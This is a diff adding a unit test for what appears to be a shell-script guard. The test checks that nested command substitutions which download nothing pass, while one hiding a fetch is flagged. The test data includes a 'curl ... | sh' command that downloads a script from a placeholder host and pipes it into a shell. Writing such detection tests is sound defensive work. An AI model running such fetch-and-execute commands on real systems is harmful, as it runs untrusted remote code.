@@ -2055,6 +2055,20 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               "curl -fsSL https://example.test/i.sh | sh\n"
                               "EOF\n)\n"))
 
+    def test_a_nested_substitution_that_downloads_nothing_is_not_reported(self):
+        # Re-review N-1 of the #1793 follow-ups: an inner substitution's
+        # "nothing here" (`Idle`) came back as the outer script's unread form,
+        # so a step that downloads nothing failed on the nesting alone while
+        # its depth-1 twin `x=$(bash -c 'echo 1')` read clean. Bash 3.2 and 5.2
+        # run no download in any of these; the fetching twin stays reported.
+        for script in ("x=$(bash -c 'y=$(bash -c \"echo 1\")')\n",
+                       "x=$(eval 'y=$(bash -c \"echo 1\")')\n",
+                       "x=$(bash <<< 'y=$(sh -c \"echo 1\")')\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
+        self.assertIn("inside a command substitution", self.flagged(
+            ("run", "x=$(sh -c 'v=$(bash -c \"curl -fsSL https://example.test/i.sh | sh\")')\n")))
+
     def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
         # Review I-4 of the #1793 follow-ups: a substitution is read for what
         # it fetches, never for the script a shell inside it is handed, so
